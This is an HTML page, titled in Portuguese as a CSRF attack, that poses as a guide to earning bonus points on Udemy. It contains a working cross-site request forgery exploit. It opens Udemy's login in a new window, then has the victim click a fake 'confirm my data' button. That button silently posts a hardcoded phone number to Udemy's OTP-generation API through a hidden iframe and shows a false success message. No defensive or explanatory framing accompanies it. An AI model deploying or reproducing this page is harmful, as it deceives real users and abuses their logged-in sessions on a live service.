<!DOCTYPE html>
<html>
<head>
    <title>Ataque CSRF - Duas Janelas</title>
</head>
<body>
    <h1>Guia para ganhar pontos extras</h1>
    <p>Siga os passos abaixo para receber pontos exclusivos:</p>
    
    <div id="step1">
        <h3>Passo 1: Faça login na sua conta</h3>
        <p>Clique no botão abaixo e faça login na sua conta. <strong>Depois de fazer login, volte para esta página</strong>.</p>
        <button id="login-button" onclick="openLoginWindow()">Fazer Login</button>
    </div>
    
    <div id="step2" style="display:none;">
        <h3>Passo 2: Confirme seus dados para receber os pontos</h3>
        <p>Agora que você está logado, clique no botão abaixo para confirmar seus dados e receber os pontos:</p>
        <button id="confirm-button" onclick="executeCsrf()">Confirmar Meus Dados</button>
    </div>
    
    <script>
        function openLoginWindow() {
            // Abre o site alvo em uma nova janela/aba
            window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US', '_blank');
            
            // Mostrar o próximo passo
            document.getElementById('step1').innerHTML = '<h3>✅ Passo 1: Login iniciado</h3><p>Após fazer login, volte para esta página e continue para o próximo passo.</p>';
            document.getElementById('step2').style.display = 'block';
        }
        
        function executeCsrf() {
            // Tenta executar o CSRF após o usuário confirmar que já fez login
            document.getElementById('confirm-button').disabled = true;
            document.getElementById('confirm-button').textContent = "Processando...";
            
            // Cria e envia o formulário para executar o CSRF
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/';
            form.enctype = 'text/plain';
            
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'Telefone';
            input.value = '14996810417';
            form.appendChild(input);
            
            // Usa um iframe para não interromper a experiência
            var iframe = document.createElement('iframe');
            iframe.name = 'csrf-frame';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            form.target = 'csrf-frame';
            document.body.appendChild(form);
            form.submit();
            
            // Feedback visual
            setTimeout(function() {
                document.getElementById('step2').innerHTML = '<h3>✅ Passo 2: Dados confirmados!</h3><p>Seus pontos serão adicionados em breve. Obrigado por participar!</p>';
            }, 1500);
        }
    </script>
</body>
</html>
